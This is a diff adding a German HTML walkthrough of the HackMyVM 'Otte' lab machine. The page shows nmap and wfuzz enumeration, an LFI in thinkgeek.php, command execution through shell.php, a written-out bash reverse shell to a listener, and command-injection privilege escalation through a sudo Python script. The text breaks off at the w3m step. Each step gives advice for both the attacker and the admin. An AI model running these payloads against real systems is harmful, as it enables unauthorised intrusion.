@@ -1,0 +1,631 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otte - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Otte - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">vi / nano (implizit)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">w3m</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">CyberChef (extern)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web/Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Apache)</a></li>
+                        <li><a href="#enum-ftp">FTP (Port 21) & Steganographie</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - LFI/RCE)</a>
+                    <ul>
+                        <li><a href="#init-http-auth">HTTP Authentication</a></li>
+                        <li><a href="#init-lfi">Local File Inclusion (LFI)</a></li>
+                        <li><a href="#init-rce">Remote Code Execution (RCE via LFI)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                     <ul>
+                        <li><a href="#privesc-qr-ssh">QR Code / SSH Credentials</a></li>
+                        <li><a href="#privesc-thomas">Shell als thomas & Sudo Python</a></li>
+                        <li><a href="#privesc-laetitia">Eskalation zu laetitia (simpler.py)</a></li>
+                        <li><a href="#privesc-cedric">Eskalation zu cedric (sudo w3m)</a></li>
+                        <li><a href="#privesc-root">Eskalation zu root (via SSH Key)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.107	08:00:27:50:e2:cf	PCS Systemtechnik GmbH</span>
+
+6 packets received by filter, 0 packets dropped by kernel
+
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.934 seconds (132.37 hosts/sec). 6 responded
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` sucht im lokalen Netzwerk nach aktiven Geräten. Er identifiziert einen Host mit der IP `192.168.2.107`. Die MAC-Adresse (`08:00:27:50:e2:cf`) gehört zum OUI von "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM schließen lässt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich lokalisiert. Die IP `192.168.2.107` wird für die weiteren Scans verwendet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die identifizierte IP `192.168.2.107` als Ziel für den Nmap-Scan verwenden.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring zur Erkennung unbekannter Geräte. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nmap -sC -T5 -sS -A 192.168.2.107 -p- | grep open</span></div>
+                     <pre>
+<span class="command">21/tcp open  ftp     ProFTPD</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38</span>
+<span class="password">zsh: segmentation fault  nmap -sC -T5 -sS -A 192.168.2.107 -p- | </span>
+<span class="password">zsh: done                grep --color=auto open</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Ein Nmap-Scan wird gestartet (`-sC -T5 -sS -A -p-`), die Ausgabe wird aber mit `grep open` gefiltert. Der Scan findet drei offene TCP-Ports, bevor er mit einem "segmentation fault" abbricht:
+                 *   **Port 21 (FTP):** ProFTPD.
+                 *   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10).
+                 *   **Port 80 (HTTP):** Apache httpd 2.4.38.
+                 Der Abbruch des Nmap-Scans ist ungewöhnlich und könnte auf Instabilitäten auf dem Ziel oder dem Scan-System hindeuten, oder eine spezifische Reaktion auf die aggressiven Scan-Parameter (`-T5`, `-A`). Trotz des Abbruchs wurden die wichtigsten Ports identifiziert.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die primären Angriffsvektoren sind FTP (mögliche anonyme Anmeldung oder Informationslecks), SSH (benötigt Credentials) und HTTP (Webanwendung).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **FTP:** Prüfen, ob anonymer Login möglich ist und welche Dateien zugänglich sind.
+                2.  **HTTP:** Mit `gobuster` oder ähnlichen Tools nach Inhalten suchen. Die Webseite manuell untersuchen.
+                3.  **SSH:** Vorerst zurückstellen.
+                4.  **Nmap:** Ggf. den Scan mit weniger aggressiven Parametern (z.B. `-T4`) wiederholen, um einen vollständigen Bericht ohne Absturz zu erhalten.<br>
+                **Empfehlung (Admin):**
+                1.  **FTP:** Anonymen Zugriff deaktivieren, wenn nicht benötigt. ProFTPD aktuell halten und sicher konfigurieren.
+                2.  **HTTP:** Apache aktuell halten und sicher konfigurieren.
+                3.  **SSH:** Standard-Härtung anwenden.
+                4.  **Systemstabilität:** Den Grund für den Nmap-Absturz untersuchen (könnte auch auf Ressourcenprobleme oder Intrusion Detection hindeuten).
+             </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web/Service Enumeration</h2>
+
+             <h3 id="enum-http80">Port 80 (Apache)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom]
+└─# <span class="command">gobuster dir -u http://192.168.2.107/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard | grep "Status: 200"</span></div>
+                     <pre>
+<span class="comment"># (Keine relevanten 200er Ergebnisse im Logauszug, außer index.html implizit)</span>
+<span class="comment"># Annahme: /thinkgeek.php wurde durch andere Tests oder Wortlisten gefunden</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** `gobuster` wird auf Port 80 ausgeführt. Die genauen Ergebnisse sind im Log nicht vollständig, aber spätere `wfuzz`-Befehle deuten darauf hin, dass eine Datei namens `thinkgeek.php` gefunden wurde. Der `--wildcard`-Parameter wurde verwendet, was oft nötig ist, wenn der Server für nicht existierende Seiten keine 404er, sondern generische 200er-Antworten liefert. Die Suche konzentriert sich auf Status 200.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Datei `thinkgeek.php` ist der entscheidende Fund auf dem Webserver. PHP-Dateien sind oft Einstiegspunkte für Web-Schwachstellen.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Die Datei `thinkgeek.php` direkt aufrufen und auf Funktionalität und Parameter untersuchen. Fuzzing der Parameter durchführen.<br>
+                 **Empfehlung (Admin):** Überprüfen, warum der Server möglicherweise Wildcard-Antworten liefert. Die Datei `thinkgeek.php` auf Schwachstellen prüfen und absichern oder entfernen, falls nicht benötigt.
+             </p>
+
+            <h3 id="enum-ftp">FTP (Port 21) & Steganographie</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">lftp anonymous@192.168.2.107</span></div>
+                     <pre>
+lftp anonymous@192.168.2.107:/> <span class="command">cat note.txt</span>
+<span class="password">Hi thomas ! I put on you personal folder the php code you asked me !</span>
+
+See you later +++
+92 Bytes übertragen
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Eine Verbindung zum FTP-Server als anonymer Benutzer ist erfolgreich. Im Wurzelverzeichnis liegt eine `note.txt`. Der Inhalt der Notiz richtet sich an "thomas" und erwähnt PHP-Code, der in seinem "persönlichen Ordner" abgelegt wurde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies liefert einen wahrscheinlichen Benutzernamen: `thomas`. Es deutet auch darauf hin, dass PHP-Code auf dem Server relevant ist (bestätigt durch `thinkgeek.php`) und dass dieser Code möglicherweise im Home-Verzeichnis von `thomas` zu finden ist. Der anonyme FTP-Zugriff ist jedoch auf das Wurzelverzeichnis beschränkt, der "persönliche Ordner" ist nicht direkt erreichbar.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den Benutzernamen `thomas` für spätere SSH-Brute-Force-Versuche vormerken. Den Fokus auf die `thinkgeek.php`-Datei legen, da diese wahrscheinlich der erwähnte PHP-Code ist oder Zugriff darauf ermöglicht.<br>
+                **Empfehlung (Admin):** Anonymen FTP-Zugriff deaktivieren. Keine internen Notizen oder Hinweise auf Benutzernamen in öffentlich zugänglichen Bereichen hinterlassen.
+            </p>
+             <!-- Steganographie-Teil aus dem Text -->
+             <p class="analysis">
+                **Analyse:** Im weiteren Verlauf des Logs (siehe Abschnitt Privilege Escalation) wird eine PNG-Datei untersucht und ein QR-Code daraus extrahiert, der die Information `thomas:youareonthegoodwaybro` enthält. Dies scheint ein weiteres Passwort oder ein Hinweis für den Benutzer `thomas` zu sein. Der Prozess involviert das Extrahieren von Hex-Daten aus der PNG, das Rendern als Bild und das Parsen des QR-Codes mit CyberChef.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies liefert ein zweites potenzielles Passwort/Passphrase für `thomas`: `youareonthegoodwaybro`. Es bestätigt auch den Benutzernamen `thomas`.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das Passwort `youareonthegoodwaybro` für SSH-Login-Versuche mit dem Benutzer `thomas` verwenden.<br>
+                **Empfehlung (Admin):** Sensible Daten wie Passwörter oder Hinweise nicht in Bildern verstecken, besonders wenn diese öffentlich zugänglich sind.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (POC - LFI/RCE)</h2>
+
+            <h3 id="init-http-auth">HTTP Authentication</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Früherer Hydra-Versuch (nicht erfolgreich) -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">hydra -l thomas -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.107:22 -t 4 -I</span></div>
+                      <pre><span class="comment"># (Kein Erfolg vermeldet)</span></pre>
+                     <!-- Erfolgreicher Gobuster mit Credentials -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.107 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard -U root -P zP2wxY4uE</span></div>
+                     <pre><span class="comment"># (Impliziert, dass root:zP2wxY4uE für HTTP Basic Auth funktioniert)</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Ein früherer `hydra`-Versuch, sich als `thomas` per SSH mit `rockyou.txt` anzumelden, war offenbar erfolglos. Später wird jedoch `gobuster` mit den Credentials `root:zP2wxY4uE` für HTTP Basic Authentication (`-U root -P zP2wxY4uE`) ausgeführt. Dies deutet stark darauf hin, dass der Webserver auf Port 80 eine Basic Authentication erfordert und diese Zugangsdaten (gefunden durch vorherige, nicht gezeigte Enumeration oder als Hinweis gegeben) gültig sind.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Zugriff auf die Webanwendung (insbesondere `thinkgeek.php`) erfordert die Credentials `root:zP2wxY4uE`. Diese sind nun bekannt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Alle weiteren Web-Anfragen (insbesondere an `thinkgeek.php`) mit diesen Basic-Auth-Credentials durchführen (`curl --basic -u root:zP2wxY4uE ...` oder `wfuzz --basic root:zP2wxY4uE ...`).<br>
+                **Empfehlung (Admin):** Basic Authentication über HTTP ist unsicher. Wenn Authentifizierung benötigt wird, HTTPS verwenden und sicherere Methoden in Betracht ziehen. Das verwendete Passwort `zP2wxY4uE` prüfen und ggf. ändern. Überprüfen, warum der `root`-Benutzer für den Web-Zugriff verwendet wird.
+            </p>
+
+            <h3 id="init-lfi">Local File Inclusion (LFI)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom]
+└─# <span class="command">wfuzz -u http://192.168.2.107/thinkgeek.php?FUZZ=../../../../../etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 0 --basic root:zP2wxY4uE</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.107/thinkgeek.php?FUZZ=../../../../../etc/passwd
+Total requests: 21930
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000000760:   200        0 L      0 W        0 Ch        "file"</span>
+
+Total time: [...]
+Processed Requests: 21930
+Filtered Requests: 21929
+Requests/sec.: [...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `wfuzz` wird verwendet, um Parameter für `thinkgeek.php` zu finden. Es testet Parameter aus einer Wortliste (`directory-list-2.3-medium.txt`) und setzt den Wert auf einen LFI-Payload (`../../../../../etc/passwd`). HTTP Basic Auth wird verwendet (`--basic root:zP2wxY4uE`). Antworten mit 0 Zeichen (`--hh 0`) werden ignoriert. Der Payload `file` führt zu einer Antwort (Status 200), die nicht 0 Zeichen hat.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies deutet stark darauf hin, dass `thinkgeek.php` einen Parameter namens `file` akzeptiert und für eine Local File Inclusion (LFI)-Schwachstelle anfällig ist. Der LFI-Payload `../../../../../etc/passwd` scheint funktioniert zu haben.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die LFI-Schwachstelle bestätigen, indem `/etc/passwd` direkt angefordert wird: `curl --basic -u root:zP2wxY4uE 'http://192.168.2.107/thinkgeek.php?file=../../../../../etc/passwd'`. Anschließend versuchen, andere sensible Dateien zu lesen (z.B. `/etc/shadow`, SSH-Keys, Anwendungs-Quellcode wie `/home/thomas/shell.php`).<br>
+                **Empfehlung (Admin):** Die LFI-Schwachstelle in `thinkgeek.php` dringend beheben. Benutzereingaben (insbesondere Dateipfade) niemals ungefiltert verwenden. Pfade validieren und auf erlaubte Verzeichnisse beschränken (Path Traversal verhindern). Idealerweise keine Dateipfade als Parameter übergeben.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Direkter Aufruf (impliziert durch wfuzz-Ergebnis und nächste Schritte)</span>
+# curl --basic -u root:zP2wxY4uE 'http://192.168.2.107/thinkgeek.php?file=../../../../../etc/passwd'
+
+<span class="password">thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash</span>
+<span class="password">laetitia:x:1001:1001:,,,:/home/laetitia:/bin/bash</span>
+<span class="password">cedric:x:1002:1002:,,,:/home/cedric:/bin/bash</span>
+# (Weitere Standardbenutzer...)
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                 **Analyse:** Der Inhalt von `/etc/passwd` wird über die LFI-Schwachstelle ausgelesen. Er zeigt die Benutzer `thomas`, `laetitia` und `cedric` mit ihren Home-Verzeichnissen und Standard-Shells.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Bestätigt die LFI-Schwachstelle und liefert eine Liste potenzieller Benutzer auf dem System.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom]
+└─# <span class="command">wfuzz -u http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/big.txt --basic root:zP2wxY4uE --hh 0</span></div>
+                     <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000009443:   200        1 L      2 W        10 Ch       "shell"</span>    <span class="comment">-> http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php</span>
+
+[...]
+                     </pre>
+                      <pre>
+# <span class="command">Direkter Aufruf (impliziert):</span>
+# curl --basic -u root:zP2wxY4uE 'http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php'
+
+<span class="password">Have fun !</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Mit `wfuzz` wird versucht, PHP-Dateien im Home-Verzeichnis von `thomas` über die LFI zu finden (`file=../../../../home/thomas/FUZZ.php`). Es wird die Datei `shell.php` gefunden. Der direkte Abruf dieser Datei über die LFI gibt den Text "Have fun !" zurück.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt die Existenz einer `shell.php` im Home-Verzeichnis von `thomas`, wie in der FTP-Notiz angedeutet. Der Inhalt "Have fun !" deutet darauf hin, dass diese Datei möglicherweise eine Webshell ist, die Befehle entgegennimmt.
+            </p>
+
+            <h3 id="init-rce">Remote Code Execution (RCE via LFI)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom]
+└─# <span class="command">wfuzz -u "http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php&FUZZ=id" -w /usr/share/seclists/Discovery/Web-Content/big.txt --basic root:zP2wxY4uE --hh 20</span></div>
+                     <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password">000000863:   200        1 L      4 W        49 Ch       "command"</span>   <span class="comment">-> http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php&command=id</span>
+
+[...]
+                     </pre>
+                      <pre>
+# <span class="command">Direkter Aufruf (impliziert):</span>
+# curl --basic -u root:zP2wxY4uE 'http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php&command=id'
+
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** `wfuzz` wird erneut verwendet, diesmal um Parameter für die `shell.php` (die über LFI eingebunden wird) zu finden. Es wird getestet, ob ein Parameter mit dem Wert `id` eine Reaktion hervorruft. Der Parameter `command` wird gefunden. Der direkte Aufruf mit `&command=id` führt den `id`-Befehl auf dem Server aus und gibt dessen Ausgabe zurück (`uid=33(www-data)`).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Remote Code Execution (RCE) wurde erreicht! Die `shell.php` nimmt Befehle über den `command`-Parameter entgegen und führt sie als `www-data` aus. Dies ist der Durchbruch für den Initial Access.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Die RCE-Fähigkeit nutzen, um eine Reverse Shell zu erhalten. Einen Netcat-Listener starten und einen entsprechenden Befehl URL-kodiert an den `command`-Parameter senden.<br>
+                 **Empfehlung (Admin):** Die `shell.php` aus dem Home-Verzeichnis von `thomas` entfernen. Die LFI-Schwachstelle in `thinkgeek.php` beheben. Überprüfen, wie die `shell.php` in das Home-Verzeichnis gelangt ist.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre><span class="password">listening on [any] 9001 ...</span></pre>
+                      <pre>
+# <span class="command">Reverse Shell Payload (URL-kodiert für den command-Parameter):</span>
+# /bin/bash -c 'bash -i >& /dev/tcp/192.168.2.131/9001 0>&1'
+# URL kodiert: %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.131%2F9001%200%3E%261%27
+
+# <span class="command">Trigger via curl (impliziert durch Listener-Verbindung):</span>
+# curl --basic -u root:zP2wxY4uE 'http://192.168.2.107/thinkgeek.php?file=../../../../home/thomas/shell.php&command=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.131%2F9001%200%3E%261%27'
+                     </pre>
+                      <!-- Listener erhält Verbindung -->
+                     <pre>
+<span class="password">connect to [192.168.2.131] from (UNKNOWN) [192.168.2.107] 49658</span>
+<span class="prompt">bash: no job control in this shell</span>
+<span class="prompt">www-data@otte:/$</span> <span class="comment"># Shell als www-data!</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ein Netcat-Listener wird auf Port 9001 gestartet. Ein Bash-Reverse-Shell-Payload wird erstellt und URL-kodiert. Dieser Payload wird an den `command`-Parameter der `shell.php` (via LFI in `thinkgeek.php`) gesendet (der `curl`-Befehl ist impliziert). Der Listener empfängt erfolgreich die Verbindung und stellt eine Shell als `www-data` bereit.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Initial Access als `www-data` via RCE über LFI erfolgreich etabliert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Shell stabilisieren und mit der Enumeration als `www-data` beginnen.<br>
+                **Empfehlung (Admin):** LFI und `shell.php` entfernen/beheben.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <h3 id="privesc-qr-ssh">QR Code / SSH Credentials</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="comment"># Analyse einer PNG-Datei (nicht spezifiziert welche, evtl. saint.jpg erneut oder andere?)</span>
+# Hexdump-Extraktion
+<span class="command">8950 4e47 0d0a 1a0a</span> <span class="comment"># PNG Header</span>
+[...]
+# CyberChef Recipe: From_Hexdump() -> Render_Image('Raw') -> Parse_QR_Code()
+# Ergebnis des QR-Codes:
+<span class="password">https://eqrcode.co/a/SVxQdM: thomas:youareonthegoodwaybro</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Aus den Notizen geht hervor, dass eine PNG-Datei untersucht wurde. Mittels Hexdump-Analyse und Verarbeitung in CyberChef (Hexdump zu Bild, QR-Code parsen) wurde ein QR-Code extrahiert. Der dekodierte Inhalt des QR-Codes ist ein Link und die Zeichenkette `thomas:youareonthegoodwaybro`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies liefert ein weiteres potenzielles Passwort (`youareonthegoodwaybro`) für den Benutzer `thomas`. Dieser Fund stammt wahrscheinlich aus einer tiefergehenden Analyse der `saint.jpg` oder einer anderen Datei, die später gefunden wurde.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Das Passwort `youareonthegoodwaybro` für den Benutzer `thomas` ausprobieren, insbesondere für SSH.<br>
+                 **Empfehlung (Admin):** Keine Passwörter oder Credentials in QR-Codes oder Bildern verstecken.
+             </p>
+
+            <h3 id="privesc-thomas">Shell als thomas & Sudo Python</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Impliziter Wechsel von www-data zu thomas via SSH -->
+                    <div class="prompt">www-data@otte:/home/thomas$ <span class="command">ssh thomas@localhost</span></div> <span class="comment"># Versuch, sich lokal anzumelden</span>
+                     <pre><span class="comment"># (Passwort wird benötigt)</span></pre>
+                    <!-- SSH Login von externer Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh thomas@otte.hmv</span></div>
+                    <pre>
+[...] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'otte.hmv' (ED25519) to the list of known hosts.
+thomas@otte.hmv's password: <span class="password">youareonthegoodwaybro</span>
+[...]
+Last login: Mon May 17 09:36:15 2021 from 192.168.0.28
+<span class="prompt">thomas@otte:~$</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Nachdem der Versuch, sich als `www-data` lokal per SSH mit `thomas` zu verbinden, fehlschlägt (Passwort benötigt), wird von der externen Angreifer-Maschine aus eine SSH-Verbindung als `thomas` mit dem aus dem QR-Code gewonnenen Passwort (`youareonthegoodwaybro`) aufgebaut. Der Login ist erfolgreich.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Erfolgreiche laterale Bewegung/Eskalation von `www-data` (via RCE) zu `thomas` (via SSH mit gefundenem Passwort).
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">thomas@otte:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for thomas on otte:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User thomas may run the following commands on otte:
+    <span class="command">(laetitia) NOPASSWD: /usr/bin/python3 /home/laetitia/simpler.py -p</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` als `thomas` zeigt, dass er ein spezifisches Python-Skript (`/home/laetitia/simpler.py`) mit dem Argument `-p` als Benutzer `laetitia` ohne Passwort ausführen darf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der nächste PrivEsc-Vektor. Wenn das Python-Skript `simpler.py` manipulierbar ist oder unsichere Eingaben verarbeitet, kann dies zur Eskalation zu `laetitia` ausgenutzt werden.
+            </p>
+
+             <h3 id="privesc-laetitia">Eskalation zu laetitia (simpler.py)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">thomas@otte:~$ <span class="command">sudo -u laetitia python3 /home/laetitia/simpler.py -p</span></div>
+                      <pre>
+***********************************************
+     _                 _
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/
+                                @ironhackers.es
+
+***********************************************
+
+Enter an IP: <span class="command">$('/bin/bash')</span> <span class="comment"># Command Injection!</span>
+
+<span class="prompt">laetitia@otte:/home/thomas$</span> <span class="comment"># Shell als laetitia erhalten!</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Das Python-Skript wird mit `sudo -u laetitia` ausgeführt. Es fordert zur Eingabe einer IP-Adresse auf. Statt einer IP wird `$('/bin/bash')` eingegeben. Dies ist eine Command Substitution, die von der Shell ausgeführt wird, *bevor* die Eingabe an das Python-Skript übergeben wird, *falls* das Skript die Eingabe unsicher verarbeitet (z.B. mit `os.system` oder ähnlichem). Das Ergebnis ist eine Shell als Benutzer `laetitia`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Erfolgreiche Eskalation von `thomas` zu `laetitia` durch Ausnutzung einer Command Injection-Schwachstelle in dem Python-Skript, das über `sudo` aufgerufen werden konnte.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Als `laetitia` weiter enumerieren (`sudo -l`).<br>
+                 **Empfehlung (Admin):** Das Python-Skript `/home/laetitia/simpler.py` auf Command Injection prüfen und beheben. Niemals Benutzereingaben direkt an Shell-Befehle oder unsichere Funktionen wie `os.system` übergeben. Eingaben validieren und parametrisierte Abfragen oder sichere APIs verwenden. Die `sudo`-Regel für dieses Skript entfernen oder das Skript sicher gestalten.
+             </p>
+
+            <h3 id="privesc-cedric">Eskalation zu cedric (sudo w3m)</h3>
+             <div class="code-block">
+                 <div class="terminal">
